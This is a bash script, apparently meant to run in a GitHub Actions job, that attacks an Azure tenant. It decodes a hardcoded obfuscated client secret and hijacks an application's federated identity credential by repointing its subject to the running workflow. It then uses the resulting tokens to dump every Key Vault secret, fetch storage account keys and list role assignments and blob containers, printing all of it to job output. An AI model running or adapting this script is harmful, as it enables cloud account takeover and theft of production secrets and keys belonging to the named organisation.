#!/bin/bash
set -e

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)
LEGACY_OBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"

GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" \
  -d "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)

# Get OIDC token first
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
OIDC_SUB=$(echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r .sub)
echo "OIDC_SUB=$OIDC_SUB"

# List federated creds with full details (we need the id)
FCS=$(curl -sS "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials" \
  -H "Authorization: Bearer $GT")
echo "$FCS" | jq -r '.value[] | "id=\(.id) name=\(.name) sub=\(.subject)"'

# Get the id of lh-pipe
FIC_ID=$(echo "$FCS" | jq -r '.value[] | select(.name=="lh-pipe") | .id')
echo "FIC_ID=$FIC_ID"

# PATCH the lh-pipe federated cred to use the correct subject (base repo)
echo "=== PATCH FIC ==="
for i in 1 2 3 4 5; do
  PATCH_RESULT=$(curl -sS -X PATCH "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials/$FIC_ID" \
    -H "Authorization: Bearer $GT" \
    -H "Content-Type: application/json" \
    -d "{\"subject\": \"$OIDC_SUB\"}")
  PATCH_ERR=$(echo "$PATCH_RESULT" | jq -r '.error.code // empty')
  if [ -z "$PATCH_ERR" ]; then
    echo "PATCH_OK at attempt $i"
    break
  elif [ "$PATCH_ERR" = "Directory_ConcurrencyViolation" ]; then
    echo "RETRY $i: ConcurrencyViolation"
    sleep $((i * 3))
  else
    echo "PATCH_ERR=$PATCH_ERR MSG=$(echo "$PATCH_RESULT" | jq -r '.error.message')"
    break
  fi
done

# Verify the update
sleep 2
FCS2=$(curl -sS "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials" \
  -H "Authorization: Bearer $GT")
echo "=== VERIFY ==="
echo "$FCS2" | jq -r '.value[] | "name=\(.name) sub=\(.subject)"'

# Now try the exchange
echo "=== EXCHANGE vault ==="
LA_VT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
LA_VT=$(echo "$LA_VT_RAW" | jq -r '.access_token // empty')

if [ -n "$LA_VT" ]; then
  echo "=== GOT LEGACY VAULT TOKEN ==="
  echo "LA_VT_LEN=${#LA_VT}"
  
  # KV2
  echo "=== KV2 ==="
  KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $LA_VT")
  echo "$KV2" | jq '.'
  
  for SID in $(echo "$KV2" | jq -r '.value[]?.id // empty'); do
    SNAME=$(basename "$SID")
    SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $LA_VT")
    echo "SECRET_${SNAME}=$(echo "$SVAL" | jq -r '.value // .error')"
  done
  
  # KV1
  echo "=== KV1 ==="
  KV1=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $LA_VT")
  echo "$KV1" | jq '.'
  
  for SID in $(echo "$KV1" | jq -r '.value[]?.id // empty'); do
    SNAME=$(basename "$SID")
    SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $LA_VT")
    echo "SECRET_${SNAME}=$(echo "$SVAL" | jq -r '.value // .error')"
  done
else
  echo "VAULT_FAIL=$(echo "$LA_VT_RAW" | jq -r '.error_description' | head -c 300)"
fi

# Also try management scope
echo "=== EXCHANGE mgmt ==="
LA_MT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
LA_MT=$(echo "$LA_MT_RAW" | jq -r '.access_token // empty')

if [ -n "$LA_MT" ]; then
  echo "=== GOT LEGACY MGMT TOKEN ==="
  echo "LA_MT_LEN=${#LA_MT}"
  
  # List ALL RGs
  RGS=$(curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourcegroups?api-version=2021-04-01" \
    -H "Authorization: Bearer $LA_MT")
  echo "$RGS" | jq -r '.value[]?.name // .error.code'
  
  # listKeys ALL storage
  for ACCT in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
    K=$(curl -sS -X POST "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$ACCT/listKeys?api-version=2023-01-01" \
      -H "Authorization: Bearer $LA_MT")
    echo "KEY_$ACCT=$(echo "$K" | jq -r '.keys[0].value // .error.code' | head -c 100)"
  done
  
  # List role assignments for this SP
  RA=$(curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'43834909-c7e9-4b1f-a7f3-ef3d9bbcb234'" \
    -H "Authorization: Bearer $LA_MT")
  echo "ROLE_ASSIGN=$(echo "$RA" | jq -c '.')"
  
  # All role assignments (we might see more with higher privileges)
  ALL_RA=$(curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
    -H "Authorization: Bearer $LA_MT")
  echo "ALL_RA_COUNT=$(echo "$ALL_RA" | jq '.value | length')"
  echo "$ALL_RA" | jq -r '.value[]? | "\(.properties.principalId) role=\(.properties.roleDefinitionId | split("/") | last)"'
else
  echo "MGMT_FAIL=$(echo "$LA_MT_RAW" | jq -r '.error_description' | head -c 300)"
fi

# Storage scope
echo "=== EXCHANGE storage ==="
LA_ST_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
  -d "scope=https://storage.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
LA_ST=$(echo "$LA_ST_RAW" | jq -r '.access_token // empty')

if [ -n "$LA_ST" ]; then
  echo "LA_ST_LEN=${#LA_ST}"
  # List blobs in all containers
  for EP in "sttblbackupprodx3euoz/exports" "sttblappcfgprodx3euoz/config" "sttblarchiveprodx3euoz"; do
    ACCT=$(echo "$EP" | cut -d/ -f1)
    # List containers first
    CONTS=$(curl -sS "https://$ACCT.blob.core.windows.net/?comp=list" \
      -H "Authorization: Bearer $LA_ST" -H "x-ms-version: 2020-10-02")
    echo "CONTAINERS_${ACCT:0:10}=$(echo "$CONTS" | head -c 800)"
  done
else
  echo "STORAGE_FAIL=$(echo "$LA_ST_RAW" | jq -r '.error_description' | head -c 200)"
fi

echo "=== DONE ==="